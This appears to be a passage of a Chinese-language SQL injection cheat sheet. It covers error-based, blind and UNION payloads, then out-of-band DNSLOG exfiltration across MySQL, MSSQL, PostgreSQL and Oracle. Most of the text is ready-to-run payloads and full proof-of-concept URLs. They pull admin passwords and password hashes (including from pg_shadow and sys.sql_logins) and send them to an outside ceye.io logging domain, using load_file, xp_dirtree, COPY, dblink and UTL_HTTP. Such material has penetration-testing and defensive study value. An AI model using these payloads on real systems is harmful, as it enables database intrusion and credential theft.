`id=1 AND (SELECT 8358 FROM(SELECT COUNT(*),CONCAT(0x716b707071,(SELECT (ELT(8358=8358,1))),0x716b766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)`

说明：ELT(N,str1,str2,str3,...) ， Returns str1 if N = 1, str2 if N = 2, and so on. Returns NULL if N is less than 1 or greater than the number of arguments. ELT() is the
complement of FIELD().

说明：FLOOR(X) Returns the largest integer value not greater than X.


- Type: time-based blind

`id=1 AND (SELECT 5177 FROM (SELECT(SLEEP(5)))ynSj)`

- Type: UNION query

`id=-5237 UNION ALL SELECT NULL,NULL,CONCAT(0x716b707071,0x7966736e67425968536f6e4e686d55544e654d4d737473774568637945746b77435063674d525141,0x716b766a71),NULL,NULL,NULL,NULL,NULL-- -`


## DNSLOG 应用

dnslog在sql注入中的应用是一种out-band应用，达到旁路查看执行效果的作用。此外在命令注入、ssrf等中也可应用。
### mysql中的情况
必要条件：
- 目标可以访问dnslog网站,（hyuga、CEYE）
- mysql数据库可以调用 load_file()
- 目标平台为windows（因为windows使用UNC路径）
- 反馈内容受DNS查询限制，太长的需要做字符串切割（例如：substring(str,1,10))



mysql服务端的文件读取有很多的条件限制，主要是mysql数据库的配置，为了安全原因，当读取位于服务器上的文本文件时，文件必须处于数据库目录且可被所有人读取。

可以在mysql命令控制台执行`show variables like '%secure%'` 来查看。会列出`secure_auth`和`secure_file_priv` , 然后使用`select @@secure_file_priv`查看内容。


参数是用来限制LOAD DATA,SELECT ... OUTFILE,DUMPFILE和LOAD_FILE()可以操作的文件夹。

`secure-file-priv` 的值可以分为三种情况：
- 值为null，表示显示mysqld不允许导入|导出;
- 值为/tmp/，表示限制mysqld的导入|导出只能发生在/tmp/目录下，此时如果读写发生在其他文件夹中，就会报错;
- 没有具体值，表示不对mysqld的导入|导出做限制。

除此之外，读取或写入文件必须拥有可操作的用户权限否则会报错。ERROR 1045 (28000): Access denied for user

下面使用load_file() 读取本地文件，假设可注入参数为：id。

载荷：`id=1 union select 1,2,load_file(concat('\\\\',(select hex(password) from test.test_user where  user='admin' limit 1),'.mysql.nk40ci.ceye.io\\abc'))`

说明：
- `password`的值会被传到.mysql.nk40ci.ceye.io\\abc。
- 使用hex()目的是减少特殊字符不能被DNS解析等干扰或编码；
- linux下无法用load_file使用dnslog，这是因为windows下使用UNC路径，即windows命名管理，用于指定和映射驱动器。例如 `\\\ss.xx\t\`
- 上面CONCAT函数拼接了4个\ ,转义后就是2个，使用unc路径，最后构造的就是 `\\密码16进制值.mysql.nk40ci.ceye.io\abc`

### mssql

网上流传较广的一个poc：
```
DECLARE @host varchar(1024);

SELECT @host=(SELECT TOP 1master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_loginsWHERE name='sa')+'.ip.port.b182oj.ceye.io';

EXEC('master..xp_dirtree"\'+@host+'\foobar$"');
```

上面的代码可以在数据库控制台执行，得到sa用户hex编码。

ms sqlserver 中字段名是不能和自定义函数名字冲突的，如果冲突需要[] 将字段用包裹，例如：

`select pass FROM test.dbo.test_user where [USER]='admin'`

这里的user字段正好和系统的user()函数相同，所以字段需要 [ ] 包裹。

此外，在sqlserver中当需要字符串拼接的时候，如果字段的值的长度没有达到表结构字段的长度，就会用空格来填充。例如pass字段设置的长度是50，所但是值实际的长度是8，之所以剩余的长度就用空格填充了。这个时候就用想办法去掉空格，查阅手册可以发现rtrim函数是可以去除右边空格的：
`select ((select rtrim(pass) from test.dbo.test_user where [USER]='admin')+'.xxnk40ci.ceye.io')`

由于域名是不能带有些特殊字符的，所以我们最好能将查询出来的值编码之后再和域名进行拼接，但是在查阅了sqlserver的手册之后，没有发现可以直接对字符类型进行编码的函数，只有将2进制转换成Hex的函数，所以这里我需要先将字符类型强制转换成varbinary二进制类型，然后再将二进制转化成Hex编码之后的字符类型。先转换成二进制,再把二进制转换成字符类型的Hex编码:

`select ((select master.dbo.fn_varbintohexstr(convert(varbinary,rtrim(pass))) from test.dbo.test_user where [USER]='admin')+'.xx.nk40ci.ceye.io')`

完整poc：
```
http://127.0.0.1/mssql.php?id=1;
DECLARE @host varchar(1024);SELECT @host=(SELECT master.dbo.fn_varbintohexstr(convert(varbinary,rtrim(pass))) 
FROM test.dbo.test_user where [USER] = 'admin')%2b'.cece.nk40ci.ceye.io';
EXEC('master..xp_dirtree "\'%2b@host%2b'\foobar$"');
```
此处有个小问题，因为拼接用到了+号，+号在url中如果不url编码到代码层的时候就成空格了，所以我们需要在提交之前对+号url编码为%2b

ms sqlserver的其它函数：
- master..xp_fileexist
- master..xp_subdirs
- OpenRowset() 
- OpenDatasource() 

后面两个是加载远程数据库的函数，需要较高权限，系统默认是关闭的，需要通过sp_configure去配置高级选项开启：

```
exec sp_configure 'show advanced options',1；　　

reconfigure；　　

exec sp_configure 'Ad Hoc Distributed Queries',1；　　

reconfigure；
```

### postgresql

可以编写一个自定义的函数和存储过程，和SQLServer类似.

copy函数的定义

```
COPY tablename [ ( column [, ...] ) ] 
FROM { 'filename' | STDIN } [ WITH ] [ BINARY ] [ OIDS ] [ DELIMITER [ AS ] 'delimiter' 'null string' ] CSV [ QUOTE [ AS ] 'quote' 'escape' ] 
[ FORCE NOT NULL column [, ...] ] 
COPY tablename [ ( column [, ...] ) ] TO { 'filename' | STDOUT } [ WITH ] [ BINARY ] [ OIDS ] [ DELIMITER [ AS ] 'delimiter' 'null string' ] 
CSV [ QUOTE [ AS ] 'quote' 'escape' ] [ FORCE QUOTEcolumn [, ...] ]
```

从定义看出这里是无法嵌套查询，它这里需要直接填入文件名，所以过程就麻烦一点。

这是网上的POC，整体上没有什么问题。

```
DROP TABLE IF EXISTS table_output;
CREATE TABLE table_output(content text);
CREATE OR REPLACE FUNCTION temp_function()RETURNS VOID AS $$DECLARE exec_cmd TEXT;
DECLARE query_result TEXT;BEGINSELECT INTO query_result (SELECT passwdFROM pg_shadow WHERE usename='postgres');
exec_cmd := E'COPY table_output(content)FROM E\'\\\\'||query_result||E'.postgreSQL.nk40ci.ceye.io\\foobar.txt\'';
EXECUTE exec_cmd;END;$$ LANGUAGE plpgSQL SECURITY DEFINER;SELECT temp_function();
```

只是需要对数据处理编一下码，此处会用到encode函数，如下

`encode(pass::bytea,’hex’)`

最后完整的POC如下：
```
http://127.0.0.1/pgSQL.php?id=1;DROP TABLE IF EXISTS table_output;

CREATE TABLE table_output(content text);

CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $$ DECLARE exec_cmd TEXT;

DECLARE query_result TEXT;

BEGIN SELECT INTO query_result (select encode(pass::bytea,'hex') from test_user where id =1);

exec_cmd := E'COPY table_output(content) FROM E\'\\\\\\\\'||query_result||E'.pSQL.3.nk40ci.ceye.io\\\\foobar.txt\'';

   EXECUTE exec_cmd;

END;

`$$ LANGUAGE plpgSQL SECURITY DEFINER;`

SELECT temp_function();
```
说明：其中`$$ LANGUAGE plpgSQL SECURITY DEFINER;`应去掉反引号。此处加上是为了能够文档排版需要。


因为这里的copy需要的参数是文件路径，所以这里其实也是利用了UNC路径，因此这个方式也只能在windows下使用

#### db_link扩展

db_link是PostreSQL用来连接其他的数据库的扩展，用法也很简单，而且可以嵌套子查询，那就很方便了

```
dblink('连接串', 'SQL语句')
http://127.0.0.1/pgsql.php?id=1;CREATE EXTENSION dblink; 
SELECT * FROM dblink('host='||(select encode(pass::bytea,'hex') from test_user where id =1)||'.vvv.psql.3.nk40ci.ceye.io user=someuser dbname=somedb', 
'SELECT version()') RETURNS (result TEXT);
```

CREATE EXTENSION dblink; 就是打开这个扩展，因为这个扩展默认是关闭的。

### Oracle
Oracle的利用方式就太多了，因为Oracle能够发起网络请求的模块是很很多的。

列举几个:

- UTL_HTTP.REQUEST
```
select name from test_user where id =1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id=1)||'.nk40ci.ceye.io') FROM sys.DUAL;

```

- DBMS_LDAP.INIT

```
select name from test_user where id =1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id=1)||'.nk40ci.ceye.io',80) FROM sys.DUAL;
```

- HTTPURITYPE
```
select name from test_user where id =1 union SELECT HTTPURITYPE((select pass from test_user where id=1)||'.xx.nk40ci.ceye.io').GETCLOB() FROM sys.DUAL;
```

- UTL_INADDR.GET_HOST_ADDRESS
```
select name from test_user where id =1 union SELECT UTL_INADDR.GET_HOST_ADDRESS((select pass from test_user where id=1)||'.ddd.nk40ci.ceye.io') FROM sys.DUAL; 
```

tips：oracle是不允许select语句后面没有表的，所以此处可以跟一个伪表dual

- Oracle其他一些能够发起网络请求的模块：
  - UTL_HTTP
  - UTL_TCP
  - UTL_SMPTP
  - UTL_URL
 

### 总结
有些函数的使用操作系统的限制。
dns查询有长度限制，所以必要的时候需要对查询结果做字符串的切割。
避免一些特殊符号的产生，最好的选择就是数据先编码再带出。
注意不同数据库的语法是有差异的，特别是在数据库拼接的时候。
有些操作是需要较高的权限。




### Sandboxes
Some useful online sandboxes for testing queries can be found below:
http://sqlfiddle.com/
http://rextester.com/l/mysql_online_compiler
https://www.tutorialspoint.com/mysql_terminal_online.php
https://www.jdoodle.com/online-mysql-terminal